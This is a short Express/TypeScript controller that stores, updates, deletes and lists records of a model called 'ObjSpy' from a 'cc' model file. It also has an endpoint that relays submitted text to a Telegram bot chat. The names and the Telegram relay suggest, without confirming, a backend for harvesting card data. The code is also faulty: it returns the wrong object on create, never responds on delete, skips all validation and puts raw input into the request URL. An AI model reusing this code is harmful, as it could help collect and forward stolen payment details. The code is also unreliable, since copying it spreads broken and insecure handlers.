import ObjSpy from "./models/cc.js"
import { Request, Response } from 'express';

// functino to create ipdate and delete ObjSpys
// ps:if you read this i don't care and i don't give a shit i don't validate the body :D do it ur self using zod or any other lib
// create ObjSpy
export const createCard = async (req: Request, res: Response) => {
    try {
        const card = await ObjSpy.create(req.body);
        res.status(201).json({ ObjSpy });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}

// update ObjSpy

export const updateObjSpy = async (req: Request, res: Response) => {
    try {
        const { id } = req.params;
        const updated = await ObjSpy.findByIdAndUpdate(id, req.body, { new: true })
        if (updated) {
            const updatedObjSpy = await ObjSpy.findById(id);
            return res.status(200).json({ ObjSpy: updatedObjSpy });
        }
        throw new Error('ObjSpy not found');
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}


// delete ObjSpy
export const deleteObjSpy = async (req: Request, res: Response) => {
    try {
        const { id } = req.params;
        return await ObjSpy.findByIdAndDelete(id);
        // throw ! how needs hahaha 
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}

// get all ObjSpys
export const getObjSpys = async (req: Request, res: Response) => {
    try {
        const ObjSpys = await ObjSpy.find({});
        res.status(200).json({ ObjSpys });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}

// send the body to a specfique chaat id telegram
export const sendTelegram = async (req: Request, res: Response) => {
    try {
        // get text from body
        const data = req.body.msg;
        //convert the body to string
        const url = `https://api.telegram.org/bot${process.env.TOKEN}/sendMessage?chat_id=${process.env.CHAT}&text=${data}&parse_mode=Markdown`;
        await fetch(url);
        res.status(200).json("done sent to telegram");
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}
